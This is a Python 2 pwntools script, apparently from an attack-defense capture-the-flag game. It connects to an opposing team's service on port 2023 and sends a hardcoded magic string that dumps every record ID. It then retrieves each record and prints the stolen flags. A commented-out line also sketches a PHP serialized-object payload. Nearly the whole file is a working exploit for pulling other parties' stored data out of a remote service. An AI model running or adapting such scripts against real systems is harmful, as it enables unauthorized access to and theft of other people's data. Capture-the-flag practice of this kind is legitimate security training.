#!/usr/bin/python2
import sys
import pwn
import uuid
import base64
queryid = uuid.uuid4().hex.upper()[0:6]

team_ip = sys.argv[1]
#team_ip ="172.19.244.211"
team_port = 2023

def pwn_send_record(p, pwnstring):
    p.readuntil('What do you want to do?\n')
    p.sendline('2')
    p.readuntil('record to add: ')
    p.sendline(pwnstring)

def pwn_python(p):
    p.sendline('0985432976321076540985432987')
    p.readuntil("RECORDS: {")
    line = p.readline()
    
    fields= line.split(",")

    ids=[]
    for f in fields:
        ID = f.split(":")[0]
        ids.append(ID.replace("'","").strip())

    flags = []
    for i in ids:
        p.sendline("3")
        p.sendline(i)
        res = p.readuntil("Welcome")
        
        if len(res.split("Welcome")[0].split("are: ")) > 1:
            flags.append(res.split("Welcome")[0].split("are: ")[1].rstrip())
    
    for i in range(len(flags)-1,0,-1):
        if "FLG" in flags[i]:
            print flags[i]
            return
    for flag in flags:
        
        if "FLG" in flag:
            print flag
            break

def pwn_retrive_record(p, pwnstring):
    p.readuntil('What do you want to do?\n')
    p.sendline('3')
    p.readuntil('identifier: ')
    p.sendline(pwnstring)

    p.readuntil('you are: ')
    flag = p.readline()

    return flag

def pwn_exit(p):
    p.readuntil('What do you want to do? ')
    p.sendline('4')


p = pwn.remote(team_ip, team_port)

#record_b64 = 'a:1:{i:0;O:6:"Record":1:{s:10:"identifier";s:6:' + base64.b64encode(queryid.encode("utf-8")) + ';}}'

#pwn_store_record(p, pwnstring)
#pwn_retrive_record(p, record_b64)

pwn_python(p)

pwn_exit(p)
